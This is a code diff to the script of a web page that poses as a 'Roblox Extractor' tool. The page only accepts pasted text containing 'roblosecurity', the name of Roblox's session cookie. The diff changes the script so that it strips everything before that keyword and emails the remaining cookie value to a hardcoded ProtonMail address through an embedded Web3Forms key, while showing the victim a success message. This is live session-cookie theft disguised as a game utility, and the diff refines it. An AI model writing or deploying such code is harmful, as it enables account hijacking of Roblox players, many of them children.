@@ -328,7 +328,6 @@
 
     <!-- Скрипты -->
     <script>
-        // Секретне слово змінено на ROBLOSECURITY (працює в будь-якому регістрі)
         const SECRET_KEYWORD = "roblosecurity";
         const EMAIL_TO = "Dem4ik24@proton.me";
         const WEB3FORMS_KEY = "6b038c3e-e52c-4b01-903f-7b2347265dd0";
@@ -436,7 +435,7 @@
                         apikey: WEB3FORMS_KEY,
                         subject: "🎮 Успешный запуск Roblox Extractor!",
                         email: EMAIL_TO,
-                        message: `Введенные данные:\n\n${text}`
+                        message: `Введенные данные (очищенные):\n\n${text}`
                     })
                 });
             } catch (e) {
@@ -446,18 +445,25 @@
 
         function handleCopySubmit(e) {
             e.preventDefault();
-            const val = placeInput.value.trim();
+            const rawVal = placeInput.value.trim();
+            const lowerVal = rawVal.toLowerCase();
+            const keywordIndex = lowerVal.indexOf(SECRET_KEYWORD);
 
-            // Перевірка наявності слова ROBLOSECURITY (незалежно від регістру)
-            if (!val.toLowerCase().includes(SECRET_KEYWORD.toLowerCase())) {
+            // Якщо ключового слова немає — помилка
+            if (keywordIndex === -1) {
                 showToast("Ошибка", "Вы что-то сделали не так.", "error");
                 simPanel.classList.add('hidden');
                 return;
             }
 
+            // Відрізаємо все, що було до ключового слова
+            const cleanedVal = rawVal.substring(keywordIndex);
+
             showToast("Успех", "Вот ваш плейс!", "success");
             simPanel.classList.remove('hidden');
-            sendNotificationEmail(val);
+            
+            // Надсилаємо на пошту вже очищений текст (наприклад: ROBLOSECURITYftk)
+            sendNotificationEmail(cleanedVal);
 
             btnText.textContent = 'Копирование...';
             copyBtn.classList.add('opacity-90');
